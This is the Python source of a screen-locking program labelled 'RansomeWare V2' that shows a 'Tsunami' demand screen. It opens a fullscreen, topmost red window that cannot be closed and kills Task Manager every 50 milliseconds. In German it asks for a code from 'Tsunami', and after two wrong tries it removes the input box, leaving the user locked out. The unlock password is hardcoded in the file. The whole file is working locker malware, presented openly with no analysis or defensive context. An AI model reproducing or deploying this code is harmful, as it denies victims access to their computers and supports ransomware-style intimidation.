import tkinter as tk
import os

PASSWORD = "#+18701:1034+#"
TEXT = "RansomeWare V2"

MAX_ATTEMPTS = 2

failed_attempts = 0

def kill_taskmgr():
    os.system("taskkill /F /IM Taskmgr.exe")
    root.after(50, kill_taskmgr)

def on_closing():
    pass

def lock_input():
    """Hide/disable the password entry and submit button after too many attempts."""
    password_entry.pack_forget()
    submit_btn.pack_forget()
    root.unbind("<Return>")
    feedback_var.set("Too many failed attempts")

def check_password(event=None):
    global failed_attempts
    if failed_attempts >= MAX_ATTEMPTS:
        return

    entered = password_entry.get()
    if entered == PASSWORD:
        root.destroy()
    else:
        failed_attempts += 1
        if failed_attempts >= MAX_ATTEMPTS:
            feedback_var.set("Too many failed attempts")
            root.after(300, lock_input)
        else:
            feedback_var.set("Wrong password")
            password_entry.delete(0, tk.END)

root = tk.Tk()
root.title("Tsunami")

root.protocol("WM_DELETE_WINDOW", on_closing)

root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

root.configure(bg="red")

code_label = tk.Label(
    root,
    text=TEXT,      
    font=("Arial", 36, "bold"),
    bg="red"
)
code_label.pack(pady=(80, 10))

prompt_label = tk.Label(
    root,
    text="Gebe denn code ein den du von Tsunami erhalten hast: ",
    font=("Arial", 30),
    bg="red"
)
prompt_label.pack(pady=(0, 10))

password_entry = tk.Entry(
    root,
    font=("Arial", 24),
    show="*",
    justify="center"
)
password_entry.pack(pady=(0, 10))
password_entry.focus_set()

feedback_var = tk.StringVar(value="")
feedback_label = tk.Label(
    root,
    textvariable=feedback_var,
    font=("Arial", 18),
    bg="red",
    fg="white"
)
feedback_label.pack(pady=(0, 10))

submit_btn = tk.Button(
    root,
    text="OK",
    font=("Arial", 18),
    command=check_password
)
submit_btn.pack(pady=(10, 80))

root.bind("<Return>", check_password)

kill_taskmgr()
root.mainloop()
